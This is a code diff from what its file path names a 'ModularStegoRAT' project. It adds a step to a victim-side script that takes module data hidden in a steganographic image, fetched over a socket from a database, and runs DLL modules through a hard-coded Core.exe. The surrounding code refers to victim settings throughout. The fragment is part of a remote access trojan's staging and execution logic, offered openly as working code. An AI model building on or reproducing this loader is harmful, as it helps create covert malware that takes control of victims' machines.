@@ -4,13 +4,13 @@ import hmac
 import base64
 import socket
 import hashlib
+import subprocess
 from PIL import Image
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.primitives.asymmetric.ec import EllipticCurvePublicKey, EllipticCurvePrivateKey
 
 """
 - The following variables are dependent on the victim
@@ -23,6 +23,7 @@ JSON_NAME = "VictimSettings.JSON"
 #Setup variables
 NO_BYTES_PER_MODULE = 2
 DB_INIT_SIZE_BYTES = 1024
+CORE_EXE_PATH = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Core\\out\\build\\x64-debug\\Core.exe"
 
 databaseHost = ""
 databasePort = 0
@@ -211,6 +212,31 @@ def ExtractFromStego(stegoPath : str):
     
     dbSocket.shutdown(socket.SHUT_RDWR)
     dbSocket.close()
+    
+    #Step 5 - Running the Core
+    for i in range(len(modules)):
+        module = modules[i]
+        moduleDLLPath = os.path.join(clientPath, str(module) + ".dll")
+        
+        #Cleaning up the setting 
+        setting = moduleSettings[i]
+        moduleSettingsStringified = []
+        for integer in setting:
+            moduleSettingsStringified.append(str(integer).rjust(3, "0"))
+        
+        print(moduleSettingsStringified)
+        
+        core = subprocess.run(
+            [CORE_EXE_PATH, moduleDLLPath, "".join(moduleSettingsStringified)],
+            capture_output=True,
+            text=True
+        )
+        
+        print(core.stdout)
+        
+        if(core.returncode != 0):
+            print(core.returncode)
+            print(core.stderr)
 
 #Loading in the JSON stuff
 victimBytesHex, (databaseHost, databasePort) = LoadSettingsFromJSON(JSON_NAME)
